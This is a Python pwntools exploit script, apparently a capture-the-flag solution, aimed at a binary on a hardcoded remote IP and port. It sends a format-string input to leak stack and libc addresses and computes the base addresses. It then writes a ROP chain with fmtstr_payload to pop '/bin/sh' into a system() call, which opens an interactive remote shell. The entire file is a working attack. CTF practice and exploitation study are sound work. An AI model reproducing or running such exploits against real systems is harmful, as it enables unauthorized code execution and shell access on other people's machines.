#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = 'debug'


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("194.31.53.241", 1339)

    return r


def main():
    r = conn()
    r.sendline("%10$pLOL%11$p")

    leak = r.recvline().decode().strip()
    print(f"[LEAK] Raw output: {leak}")

    # Extract the actual addresses using regex (safer)
    import re
    matches = re.findall(r'0x[0-9a-fA-F]+', leak)

    if len(matches) >= 2:
        stack_addr = int(matches[0], 16)
        libc_addr = int(matches[1], 16)

        print(f"[+] Stack leak: {hex(stack_addr)}")
        print(f"[+] Libc leak:  {hex(libc_addr)}")

        # Optional: compute libc base
        libc_base = libc_addr - 0x92415
        stack_base = stack_addr - 0x1fcd0
        print(f"[+] Libc base:  {hex(libc_base)}")
        print(f"[+] Stack base: {hex(stack_base)}")
        libc.address = libc_base
        print(f"[+] Updated libc base: {hex(libc.address)}")

    else:
        print("[-] Could not extract both addresses from output.")

    target = stack_base + 0x1fd28
    print(f"[+] Target address: {hex(target)}")
    pop_rdi = libc_base + 0x000000000010f75b
    ret = libc_base + 0x0000000000116c4e
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    r.sendline(fmtstr_payload(6,{target: pop_rdi}))
    r.sendline(fmtstr_payload(6, {target + 8: bin_sh}))
    r.sendline(fmtstr_payload(6, {target + 16: ret}))
    r.sendline(fmtstr_payload(6, {target + 24: libc.sym['system']}))
    sleep(3)
    r.sendline("exit")
    r.interactive()




if __name__ == "__main__":
    main()
